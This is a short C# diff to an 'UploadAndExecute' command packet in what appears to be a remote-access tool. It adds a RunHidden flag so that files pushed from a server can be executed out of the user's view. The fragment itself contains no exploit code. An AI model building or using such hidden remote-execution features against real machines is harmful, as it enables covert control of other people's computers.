@@ -11,11 +11,15 @@ namespace Core.Packets.ServerPackets
         [ProtoMember(2)]
         public string FileName { get; set; }
 
+        [ProtoMember(3)]
+        public bool RunHidden { get; set; }
+
         public UploadAndExecute() { }
-        public UploadAndExecute(byte[] bytes, string fileName)
+        public UploadAndExecute(byte[] filebytes, string filename, bool runhidden)
         {
-            FileBytes = bytes;
-            FileName = fileName;
+            this.FileBytes = filebytes;
+            this.FileName = filename;
+            this.RunHidden = runhidden;
         }
 
         public void Execute(Client client)
